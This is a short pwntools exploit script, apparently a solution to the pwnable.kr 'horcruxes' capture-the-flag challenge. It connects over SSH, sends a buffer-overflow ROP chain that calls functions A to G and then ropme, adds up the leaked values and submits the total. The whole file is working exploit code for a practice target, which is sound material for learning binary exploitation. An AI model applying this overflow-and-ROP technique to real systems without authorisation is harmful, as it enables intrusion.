from pwn import *

s = ssh('horcruxes', 'pwnable.kr', 2222, 'guest')

#p = s.process('./horcruxes')
p = s.remote("0", 9032)
e = ELF('./horcruxes')

A = e.symbols['A']
B = e.symbols['B']
C = e.symbols['C']
D = e.symbols['D']
E = e.symbols['E']
F = e.symbols['F']
G = e.symbols['G']

ropme = e.symbols['ropme']

p.sendlineafter(b'Menu:', b'1')
payload = b'A' * 120 + p32(A) + p32(B) + p32(C) + p32(D) + p32(E) + p32(F) + p32(G) + p32(ropme)
p.sendlineafter(b' : ', payload)
sum = 0
for i in range(7):
    p.recvuntil(b'(EXP +')
    sum += int(p.recvuntil(b")")[:-1])

sum = sum & 0xFFFFFFFF
if sum > 0x7FFFFFFF:
    sum = sum - 0x100000000
p.sendlineafter(b"Menu:", b'1')
p.sendlineafter(b' : ', str(sum).encode())

p.interactive()
